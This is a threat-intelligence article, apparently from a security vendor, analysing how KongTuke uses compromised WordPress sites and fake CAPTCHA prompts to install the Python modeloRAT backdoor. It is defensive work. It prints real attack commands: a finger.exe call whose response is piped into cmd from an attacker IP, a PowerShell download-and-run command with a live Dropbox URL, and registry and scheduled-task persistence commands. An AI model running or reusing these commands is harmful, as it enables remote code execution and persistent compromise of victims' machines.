# Through the Lens of MDR: Analysis of KongTuke’s ClickFix Abuse of Compromised WordPress Sites

- **Source :** trendmicro
- **URL :** https://www.trendmicro.com/en/research/26/c/kongtuke-clickfix-abuse-of-compromised-wordpress-sites.html
- **Date :** 2026-03-10

---

Malware

# Through the Lens of MDR: Analysis of KongTuke’s ClickFix Abuse of Compromised WordPress Sites

Our analysis of an active KongTuke campaign deploying modeloRAT — malware capable of reconnaissance, command execution, and persistent access — through compromised WordPress sites and fake CAPTCHA lures shows that the group still operates this delivery chain in parallel with the newer CrashFix technique.

By: Aira Marcelo, Jovit Samaniego, Ryan Maglaque, Fe Cureg, Lisa Wu 2026/03/10 Read time:  ( words) 

[ ![Share](https://www.trendmicro.com/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/share-more.svg) ](https://www.addtoany.com/share) ![Print](https://www.trendmicro.com/etc.clientlibs/trendresearch/clientlibs/clientlib-trendresearch/resources/img/printer.svg)

Save to Folio

__

* * *

Key takeaways

  * TrendAI Vision One™ Services — Managed Detection and Response (MDR) uncovered ongoing attacks linked to the KongTuke threat group, which continues to use compromised WordPress websites and fake CAPTCHA lures to deliver the Python-based modeloRAT. The attackers inject malicious JavaScript into legitimate WordPress websites, prompting users to run a PowerShell command that triggers a multistage infection process.
  * Our MDR findings confirm that the group continues to use this method alongside the newer CrashFix technique, which tricks users into installing a malicious browser extension to initiate infection.
  * The attack relies heavily on legitimate system tools and trusted services to avoid detection. By abusing components such as PowerShell, finger.exe, Dropbox-hosted files, and portable Python environments, the malware can execute commands remotely, maintain persistence, and remain active on compromised systems while leaving limited visible traces.
  * Organizations whose users browse compromised websites or encounter prompts asking them to run commands could be at risk.
  * The malware specifically checks whether a system is part of a corporate domain and identifies installed security tools before continuing, suggesting a focus on enterprise environments rather than opportunistic infections.



# TrendAI Vision One™ Services – Managed Detection and Response (MDR) analysis

## Initial Access

In January 2026, Huntress [researchers](https://www.huntress.com/blog/malicious-browser-extention-crashfix-kongtuke) identified a new initial access technique used by the threat actor KongTuke, dubbed as “CrashFix”. In this ClickFix variation, the users are tricked into installing a malicious Chrome extension that displays a fake security warning, stating that the browser has “stopped abnormally.” It then prompts the unsuspecting users to follow remediation instructions. Once they follow the instructions, they’ll inadvertently execute a malicious PowerShell command.

[ ![Figure 1. modeloRAT’s infection chain using compromised websites as vector](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/clickfix/clickfix-abuse_infection-chain.jpg) ](/content/dam/trendmicro/global/en/research/26/c/clickfix/clickfix-abuse_infection-chain.jpg)

Figure 1. modeloRAT’s infection chain using compromised websites as vector

[ download ](/content/dam/trendmicro/global/en/research/26/c/clickfix/clickfix-abuse_infection-chain.jpg)

In our [MDR](https://www.trendmicro.com/en/business/services/managed-xdr.html) investigation, however, we found no evidence of the CrashFix browser-extension method. Instead, TrendAI Vision One™ Forensics indicates that the older ClickFix-style fake CAPTCHA lure was likely used. Prior to execution, the user searched for “florida 2025 IDTF facility” and accessed a legitimate WordPress website. 

[ ![Figure 2. TrendAI Vision One™ Forensics showing a sample browser history of the victim](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig2.png) ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig2.png)

Figure 2. TrendAI Vision One™ Forensics showing a sample browser history of the victim

[ download ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig2.png)

While we did not directly observe on-screen activity after the visit, retrospective inspection via VirusTotal revealed injected external JavaScript references:

  1. hxxps://ainttby[.]com/6f54.js
  2. hxxps://ctpsih[.]com/2d5h.js



[ ![Figure 3. Code snippets showing the injected JS scripts on the compromised website visited by the user](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig3a.png) ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig3a.png)

[ download ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig3a.png)

[ ![Figure 3. Code snippets showing the injected JS scripts on the compromised website visited by the user](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig3b.png) ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig3b.png)

Figure 3. Code snippets showing the injected JS scripts on the compromised website visited by the user

[ download ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig3b.png)

A [report](https://www.levelblue.com/blogs/spiderlabs-blog/yet-another-nodejs-backdoor-yanb-a-modern-challenge) from April 2025 linked similar injected scripts to KongTuke activity. Infrastructure characteristics — including naming conventions and autonomous system number (ASN) overlaps — aligned with what can be observed on the identified domains.

Although those domains are now inactive, visiting the compromised website revealed another injected script: hxxps://foodgefy[.]com/6o0jk.js (162.33.178[.]171 — AS399629 [BL Networks]).

[ ![Figure 4. Screenshots of the compromised website \(left\) and snippets showing the injected malicious JS script \(right\), via hxxp\[://\]foodgefy\[.\]com/6o0jk\[.\]js](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig4a.png) ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig4a.png)

[ download ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig4a.png)

[ ![Figure 4. Screenshots of the compromised website \(left\) and snippets showing the injected malicious JS script \(right\), via hxxp\[://\]foodgefy\[.\]com/6o0jk\[.\]js](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig4b.png) ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig4b.png)

Figure 4. Screenshots of the compromised website (left) and snippets showing the injected malicious JS script (right), via hxxp[://]foodgefy[.]com/6o0jk[.]js

[ download ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig4b.png)

The injected script aligns with the documented Kongtuke tradecraft, which does the following:

  1. Set a cookie.
  2. Make a request to a Cloudflare endpoint to get trace information (such as the user’s IP).
  3. Determines the user’s browser and operating system.
  4. Sends the information to hxxp[://]foodgefy[.]com/6o0jk[.]js.



After receiving a response, the script dynamically injects and executes whatever content the remote server returns using document.write(). In effect, it allows the external server to remotely control and inject arbitrary content or code into the website.  
  
Moreover, direct access to the malicious domain returns the string “It works,” which is consistent with what the report described.

[ ![Figure 5: The message shown when directly accessing the malicious script’s domain](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig5.png) ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig5.png)

Figure 5: The message shown when directly accessing the malicious script’s domain

[ download ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig5.png)

Per the earlier report, the execution of the injected JS leads to a fake CAPTCHA page instructing the user to run a PowerShell command. While the PowerShell observed in our case differed from the April 2025 example, it exactly matched the command documented in a separate [January 2026 finding](https://alertoverload.com/posts/2026/01/kongtuke---clickfix-on-steroids/), which described the same infection chain of a compromised WordPress site with an injected JS, leading to a fake CAPTCHA lure then PowerShell execution.

[Recent VirusTotal submissions](https://www.virustotal.com/gui/search/content%253A%2522script%2520data-cfasync%253D'false'%2520async%2520src%2522%2520fs%253A2026-02-24-?type=files) shows numerous WordPress sites injected with similar scripts, indicating that this delivery vector remains active and scalable.

Although we cannot conclusively confirm user-side interaction with the fake CAPTCHA prompt, the combination of browsing telemetry, injected script discovery, infrastructure overlap, and matching PowerShell tradecraft strongly suggests this was the initial access vector in our case.

## Execution

We were able to track that the user opened the Run dialog box and pasted the clipboard contents to explorer.exe then launched a hidden command prompt session that copied the built-in Windows tool, **finger.exe,** to a temporary file (**ct.exe**) and executed it. The renamed binary connected to an external IP (**45.61.138[.]224**) and piped the response directly into the command interpreter, enabling remote command execution (RCE).

Although finger.exe is a legitimate Windows networking tool, it was abused in this instance to establish unauthorized remote access.

The following is the malicious command used:

  * cmd /c start "" /min cmd /c "copy %windir%\system32\finger.exe %temp%\ct.exe&%temp%\ct.exe confirm@45.61.138[.]224|cmd"\1



[ ![Figure 6. RunMRU registry artifacts identified via remote access investigation in TrendAI Vision One™](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig6.png) ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig6.png)

Figure 6. RunMRU registry artifacts identified via remote access investigation in TrendAI Vision One™

The finger.exe utility retrieves a large CharCode blob containing PowerShell code obfuscated with a rotation-style (ROT) cipher. It reconstructs and decodes it in memory, then executes it without initially writing to the disk. The decoded loader then downloads a second-stage script to %AppData%\script.ps1, runs it via PowerShell, and deletes it to reduce forensic evidence. This demonstrates layered obfuscation, in-memory execution, and transient file artifacts to evade detection.

[ ![Figure 7. Telemetry evidence of the obfuscated command in  TrendAI Vision One™](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig7.png) ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig7.png)

Figure 7. Telemetry evidence of the obfuscated command in TrendAI Vision One™

[ download ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig7.png)

With TrendAI Vision One™ telemetry revealing the deobfuscated script, we saw that it performs several reconnaissance and environment-validation checks:

**Process enumeration and anti-analysis checks:**

  * It defines an array ($m) containing names of common security and analysis tools such as **Wireshark, Procmon, Process Hacker, x64dbg, OllyDbg, IDA, Ghidra, Fiddler, Sysmon, VMware, and VirtualBox.**
  * It enumerates running processes (Get-Process) and compares each process name against that list.
  * If any match is found, the script immediately exits — a classic antidebugging/anti-VM technique to avoid execution in analyst environments.
  * ****
  * **Domain membership verification:**
  * It extracts domain information from systeminfo to determine whether the host is joined to a domain or in a WORKGROUP.
  * This behavior suggests the campaign prioritizes enterprise environments, likely to conduct lateral movement and maximize potential impact.
  * ****
  * **Security product enumeration:**
  * The script queries WMI using: _Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct_****
  * This collects installed antivirus product names.
  * ****
  * **Command-and-control (C &C) communication via HTTP POST:**
    *   * It sends the collected data via HTTP POST to: hxxp://45.61.138[.]224/n.
  * The message body includes:
  * A campaign identifier (e.g., ABCD111n$ or BCDA222n$).
  * The detected antivirus product names.
  * Different identifiers depending on domain vs workgroup status.



**Execution method**

  * It uses Invoke-WebRequest (iwr) and pipes output to iex (Invoke-Expression), indicating potential execution of returned content from the C&C server.



[ ![Figure 8. Telemetry evidence of the deobfuscated script in TrendAI Vision One™](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig8.png) ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig8.png)

Figure 8. Telemetry evidence of the deobfuscated script in TrendAI Vision One™

If domain-joined, it does the following:

  1. **Download a ZIP file from Dropbox.** It uses the PowerShell commmand iwr -Uri " hxxps://www[.]dropbox[.]com/..." -OutFile "$env:appdata\Winpython.zip" to retrieve a ZIP archive from an attacker-controlled Dropbox link and saves it to %AppData%.



[ ![Figure 9. Telemetry evidence of the malicious command downloading 1.zip to Winpython.zip](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig9.png) ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig9.png)

Figure 9. Telemetry evidence of the malicious command downloading 1.zip to Winpython.zip

  2. **Extract the archive.** It uses the command Expand-Archive -Path "$env:appdata\Winpython.zip" -DestinationPath "$env:appdata" to unpack what appears to be a portable Python distribution (WPy64-31401).
  3. **Execute Python with a malicious script.** Through the command Start-Process -FilePath "$env:appdata\WPy64-31401\python\pythonw.exe" `  
-ArgumentList "$env:appdata\WPy64-31401\python\modes.py", it launches pythonw.exe (no visible console window) to run modes.py.



We found that the ModeloRAT subsequently downloaded an additional payload from a Dropbox URL, which delivered a Python script named **extentions.py**. This script was executed using python.exe.   
  
**Command** : -NonInteractive -NoProfile -WindowStyle Hidden -Command "iwr -Uri 'https://www.dropbox.com/scl/fi/np4h0kexqq5r9vlpzwg4d/rp?rlkey=fwg1koexylntccobyxaliju7w&st=3wxzp44k&dl=1' -OutFile \"$env:appdata\WPy64-31401\python\extentions.py\"; ls \"$env:appdata\WPy64-31401\python\"; Start-Process -FilePath \"$env:appdata\WPy64-31401\python\pythonw.exe\" -ArgumentList \"$env:appdata\WPy64-31401\python\extentions.py\";"

[ ![Figure 10. Evidence of the suspicious FilePath, C:\\Users\\<USERNAME>\\AppData\\Roaming\\WPy64-31401\\<....> taken on  TrendAI Vision One™](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig10.png) ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig10.png)

Figure 10. Evidence of the suspicious FilePath, C:\Users\<USERNAME>\AppData\Roaming\WPy64-31401\<....> taken on TrendAI Vision One™

Upon execution, modeloRAT’s modes.py module initiates reconnaissance activity that profiles the compromised host before advancing to subsequent stages of intrusion.

Telemetry analysis shows the malware invoking PowerShell in **hidden, non-interactive mode** , executing a rapid sequence of enumeration commands without user input. The script systematically collects:

  * Network configurations and active TCP connections.
  * System identity and privilege context.
  * Running processes and installed services.
  * Storage volumes and filesystem details.
  * Domain membership and environment classification.



The output of these commands is formatted into structured JSON, indicating that the harvested data is intended for automated parsing and likely transmission to a C&C infrastructure.

[ ![Figure 11. Telemetry evidence of modeloRAT’s reconnaissance activity](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig11.png) ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig11.png)

Figure 11. Telemetry evidence of modeloRAT’s reconnaissance activity

[ download ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig11.png)

Subsequently, this Python-based process (pythonw.exe executing modes.py) initiated repeated outbound connections to external IPs (158.247.252.178:80 and 170.168.103.208:80) and an HTTPS connection to 149.154.164.13 (associated with Telegram infrastructure), indicating likely C&C communication with both direct IP-based endpoints and a Telegram-backed channel.

For persistence, the following registry entries are created: 

  * objectRegistryValue: **monitoringservice**
  * objectRegistryKeyHandle: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
  * objectRegistryData: C:\Users\**< USERNAME>**\AppData\Roaming\WPy64-31401\python\pythonw.exe C:\Users\**< USERNAME>**\AppData\Roaming\WPy64-31401\python\modes.py start  
  




[ ![Figure 12. Snapshot of Task Manager showing the added startup via Remote Access in  TrendAI Vision One™](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig12.png) ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig12.png)

Figure 12. Snapshot of Task Manager showing the added startup via Remote Access in TrendAI Vision One™

[ download ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig12.png)

It also establishes persistence by creating a scheduled task named “**SoftwareProtection** ,” designed to blend in as legitimate software protection service. It repeatedly executes the malicious Python payload every five minutes via the following:

"C:\Windows\system32\schtasks.exe" /create /tn **SoftwareProtection** /tr ""C:\Users\**< USERNAME>**\AppData\Local\Microsoft\Windows\SoftwareProtectionPlatform\run.exe" "C:\Users\**< USERNAME>**\AppData\Local\Microsoft\Windows\SoftwareProtectionPlatform\udp.pyw"" /sc minute /mo 5 /f

[ ![Figure 13. Evidence of pythonw.exe renamed as “run.exe”](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig13.png) ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig13.png)

Figure 13. Evidence of pythonw.exe renamed as “run.exe”

[ ![Figure 14. A list of files dropped under the created folder “SoftwareProtectionPlatform” via Remote Access in TrendAI Vision One™ ](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig14.png) ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig14.png)

Figure 14. A list of files dropped under the created folder “SoftwareProtectionPlatform” via Remote Access in TrendAI Vision One™ 

[ download ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig14.png)

Our analysis _udp.pyw_ file shows that this threat employs a multilayered obfuscation to prevent string analysis or manual investigation of the script.

After decoding the entry, we get the next layer where it utilized the following steps:

  * Reverses the entry
  * Applies Base64 decoding
  * Decompresses it using zlib



The result of this execution leads to another round of obfuscated code that contains similar structure. After 32 iterations of deobfuscation, it revealed code that contains the following:

  * **Anti-debugging functions:** Checks for system debuggers via Windows API or detect Python debuggers
  * **Multilayer encryption:** Base85 encoding, AES-256 encryption, Zlib compression, and compiled python code
  * **Payload execution:** Loads compiled bytecode(payload) via the marshal module



[ ![Figure 15.  Snippet showing the final code after deobfuscation](https://www.trendmicro.com/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig15.png) ](/content/dam/trendmicro/global/en/research/26/c/clickfix/Fig15.png)

Figure 15. Snippet showing the final code after deobfuscation

While the execution of the bytecode was not successful in our tests, we saw that it contains strings and a reference to another file named **AppData\Local\Microsoft\Windows\SoftwareProtectionPlatform\run.pyw** , which was also dropped in the same infected host.  
  
The following is a list of extracted names/functions:

Names: ('psutil', 'os', 'subprocess', 'sys', 'time', 'getcwd', 'var_de19fc0291090dcb', 'path', 'normcase', 'var_2e81fe4a2321309f', '_decrypt_str', 'var_358b2857d44181b1', 'startswith', 'exit', 'main', '__name__')

Analyzing the file run.pyw shows that it has similar structure and flow as udp.pyw, but with a larger data this time around. Applying the same deobfuscation method, we saw run.pyw loads the Python bytecode via the marshal module. The following is a list of extracted names/functions:

Names: ('socket', 'sys', 'subprocess', 'os', 'html', 're', 'time', 'bs4', 'BeautifulSoup', 'threading', 'psutil', 'requests', 'Crypto.Util.Padding', 'Crypto', 'base64', 'getcwd', 'var_de19fc0291090dcb', 'path', 'normcase', 'var_2e81fe4a2321309f', '_decrypt_str', 'var_358b2857d44181b1', 'startswith', 'exit', 'var_c68c19a0ea74d15a', 'var_2b6b8037e2428633', 'var_d7ee27df16fe75f8', 'var_0d6f193b19a44f4a', 'var_6560076c59ac87ac', 'check', 'Thread', 'var_fd8ce270b6003277', 'start', 'get', 'var_cea36d54b621a48f', 'text', 'var_d09efe76ced85d6d', 'find', 'var_0e23b5f319056839', 'var_7c5f6bb71383d3f3', 'split', 'var_6d5d29b8058bdf65', 'var_687b9b2c70a5c665', 'var_faf655de6214f02a', 'var_86c69be4c78f2621', 'b64decode', 'var_1363a4c4e644abdf', 'bytes', 'enumerate', 'len', 'var_40eab56476d5b9f6', 'decode', 'var_ae751dbc35895e07', 'var_794ede7b4b034ebe', 'xor_encrypt_decrypt', 'get_codepage', 'run_command', 'get_domain', 'connect_to_server', 'authenticate', 'main', '__name__')

The bytecode includes string entries related to functions for internet access, system control, and self-concealment, indicating it is a persistent backdoor designed for remote access and command execution.

# Conclusion and security recommendations

The Kongtuke threat group is not replacing their old tradecraft but expanding it. While security reporting from Huntress highlighted the emergence of the new CrashFix technique, our MDR findings confirm that the group still uses compromised WordPress websites and fake CAPTCHA lures as infection vector.

Both delivery paths — CrashFix browser-extension abuse and ClickFix/fake CAPTCHA chains — ultimately converge on the same objective: the deployment of the Python-based modeloRAT. The consistency of the payload across different initial access methods demonstrates a mature, modular operation. Kongtuke is diversifying entry techniques while maintaining a stable and reliable post-exploitation framework.

Telemetry from VirusTotal further supports that this activity could still be ongoing. Multiple compromised websites remain injected, increasing the likelihood of continued exposure. This also demonstrates the group’s focus on scale, persistence, and adaptability rather than single-wave campaigns.

Organizations can mitigate this threat by adopting a layered defensive approach:

  * **Harden and maintain web servers.** Regularly patch and update WordPress core files, themes, and plugins to reduce the risk of site compromise. Disable unused plugins and enforce strong administrative controls.
  * **Enhance endpoint detection and monitoring (EDR).** Configure EDR solutions to alert on suspicious command-line activity, encoded PowerShell, unusual parent-child process relationships, and anomalous outbound network connections.
  * **Strengthen user awareness training.** Educate users that legitimate websites and security tools will never require copying and running commands to fix errors or complete CAPTCHA-style verifications.



Because this campaign ultimately relies on human-initiated execution, combining technical controls with continuous user education is essential to effectively reduce organizational risk.

# Proactive security with TrendAI Vision One™ 

[TrendAI Vision One™](/en/business/products/one-platform.html) is the industry-leading AI cybersecurity platform that centralizes cyber risk exposure management, security operations, and robust layered protection. 

**TrendAI Vision One™ Threat Intelligence Hub**

[TrendAI Vision One™ Threat Intelligence Hub](/en/business/products/threat-intelligence.html) provides the latest insights on emerging threats and threat actors, exclusive strategic reports from TrendAI™ Research, and TrendAI Vision One™ Threat Intelligence Feed in the TrendAI Vision One™ platform. 

Emerging Threats:   
[KongTuke's ClickFix Abuse of Compromised WordPress Sites](https://portal.xdr.trendmicro.com/index.html#/app/ti/intelligence_insights?name=KongTuke's%20ClickFix%20Abuse%20of%20Compromised%20WordPress%20Sites "KongTuke's ClickFix Abuse of Compromised WordPress Sites")****

**TrendAI Vision One™ Intelligence Reports (IOC Sweeping)******

[KongTuke's ClickFix Abuse of Compromised WordPress Sites](https://portal.xdr.trendmicro.com/index.html#/app/ti/intelligence?intrusionSet=KongTuke's%20ClickFix%20Abuse%20of%20Compromised%20WordPress%20Sites)****

**TrendAI Vision One™ Search App**

TrendAI Vision One™ customers can use the Search App to match or hunt the malicious indicators mentioned in this blog post with data in their environment. 

## Hunting Queries

**ModeloRat Detection in Vision One**

_malName:*MODELORAT* AND eventName:MALWARE_DETECTION AND LogType: detection_

**Scheduled Task Creation**

eventSubId: 101 AND parentCmd:services.exe AND processCmd:Schedule AND objectFilePath:C:\\\Windows\\\System32\\\Tasks\\\SoftwareProtection****

More hunting queries are available for TrendAI Vision One™ with [Threat Intelligence Hub](/en/business/products/threat-intelligence.html) entitlement enabled. 

Indicators of Compromise (IOCs)

The indicators of compromise for this entry can be found [here](/content/dam/trendmicro/global/en/research/26/c/clickfix/MDR-ClickFix-IOC.txt).

Tags

[Research](/en/research.html?category=trend-micro-research:article-type/research) | [Phishing](/en/research.html?category=trend-micro-research:threats/phishing) | [Articles, News, Reports](/en/research.html?category=trend-micro-research:medium/article) | [Cyber Threats](/en/research.html?category=trend-micro-research:threats/cyber-threats)

###  Authors 

  * Aira Marcelo

Incident Response Analyst

  * Jovit Samaniego

Incident Response Analyst

  * Ryan Maglaque

Incident Response Analyst

  * Fe Cureg

Threats Analyst

  * Lisa Wu

Senior Security Analyst




[ Contact Us ](mailto:tm_research@trendmicro.com)

### Related Articles

  * [ Unveiling Earth Kapre aka RedCurl’s Cyberespionage Tactics With Trend Micro MDR, Threat Intelligence ](/en/research/24/c/unveiling-earth-kapre-aka-redcurls-cyberespionage-tactics-with-t.html)
  * [ A Secure Access Service Edge (SASE) Guide for Leaders ](/en/research/22/h/secure-access-service-edge-sase-security-company.html)
  * [ Why the Open Secure AI Alliance Matters: Open Frontier Models, Open Deployment Flexibility ](/en/research/26/g/open-secure-ai-alliance.html)



[ See all articles ](/en/research.html)

[ ](/en/research.html)